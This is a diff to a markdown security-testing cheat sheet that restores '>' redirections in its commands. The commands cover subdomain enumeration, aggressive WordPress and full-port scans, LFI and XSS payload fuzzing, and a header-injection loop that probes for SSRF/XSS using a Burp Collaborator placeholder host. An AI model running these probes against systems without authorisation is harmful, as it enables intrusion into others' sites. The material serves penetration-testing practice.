@@ -718,12 +718,12 @@ nmap --script ssl-cert -p 443 <IP Address>
 
 #### 1) Subdomain discovery
 ```bash
-subfinder -d example.com -all -recursive #### subdomain.txt
+subfinder -d example.com -all -recursive > subdomain.txt
 ```
 
 #### 2) Alive filtering
 ```bash
-cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 #### subdomains_alive.txt
+cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
 ```
 
 #### 3) Passive URLs
@@ -742,7 +742,7 @@ echo example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f
 katana -u https://example.com -d 5 | grep '=' | urldedupe | anew output.txt
 cat output.txt | sed 's/=.*/=/' >final.txt
 echo example.com | gau --mc 200 | urldedupe >urls.txt
-cat urls.txt | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '=' | sort #### output.txt
+cat urls.txt | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '=' | sort > output.txt
 cat output.txt | sed 's/=.*/=/' >final.txt
 ```
 
@@ -765,7 +765,7 @@ site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:
 
 #### 15) WordPress aggressive scan
 ```bash
-wpscan --url https://site.com --disable-tls-checks --api-token <here#### -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
+wpscan --url https://site.com --disable-tls-checks --api-token <here> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
 ```
 
 #### 16 & 36) LFI methodologies
@@ -808,7 +808,7 @@ Ssl.cert.subject.CN:'example.com' 200
 #### 28–29) XSS pipeline
 ```bash
 echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
-cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u #### final.txt
+cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt
 ```
 
 #### 30–32) Network scanning
@@ -822,7 +822,7 @@ masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt
 ```bash
 ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr 'root:'
 ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr '<script>alert('XSS')</script>'
-cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e '\e[1;32m$url\e[0m'"\n"'Method[1] X-Forwarded-For: xss+ssrf =#### '$xss1"\n"'Method[2] X-Forwarded-Host: xss+ssrf ==...
+cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e '\e[1;32m$url\e[0m'"\n"'Method[1] X-Forwarded-For: xss+ssrf => '$xss1"\n"'Method[2] X-Forwarded-Host: xss+ssrf ==...
 ```
 
 ### Tips
